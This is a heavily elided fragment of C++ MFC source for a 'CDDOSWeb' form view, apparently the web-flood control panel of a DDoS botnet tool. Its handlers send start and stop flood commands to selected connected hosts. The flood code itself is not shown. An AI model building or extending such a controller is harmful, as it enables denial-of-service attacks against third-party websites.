...
IMPLEMENT_DYNCREATE(CDDOSWeb, CFormView)

CDDOSWeb::CDDOSWeb()
	: CFormView(CDDOSWeb::IDD)
{
	//{{AFX_DATA_INIT(CDDOSWeb)
...
void CDDOSWeb::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDDOSWeb)
...
BEGIN_MESSAGE_MAP(CDDOSWeb, CFormView)
	//{{AFX_MSG_MAP(CDDOSWeb)
...
/////////////////////////////////////////////////////////////////////////////
// CDDOSWeb diagnostics

#ifdef _DEBUG
void CDDOSWeb::AssertValid() const
{
	CFormView::AssertValid();
}

void CDDOSWeb::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG
...
/////////////////////////////////////////////////////////////////////////////
// CDDOSWeb message handlers

void CDDOSWeb::OnWebStart() 
{
...
void CDDOSWeb::OnWebStop() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SendDDostStopCommand("Web 1");
	GetDlgItem(IDC_COMBO_WEBMODLE)->EnableWindow(TRUE);
}

void CDDOSWeb::OnInitialUpdate() 
{
...
void CDDOSWeb::OnSelchangeComboWebmodle() 
{
	// TODO: Add your control notification handler code here
	CString temp;
...
void CDDOSWeb::OnSlectAll2() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SeclectAll();
}

void CDDOSWeb::OnSlectNow2() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SeclectNow();
}

void CDDOSWeb::OnUnslectAll2() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->UnSeclectAll();
}

void CDDOSWeb::OnUnslectNow2() 
{
	// TODO: Add your control notification handler code here
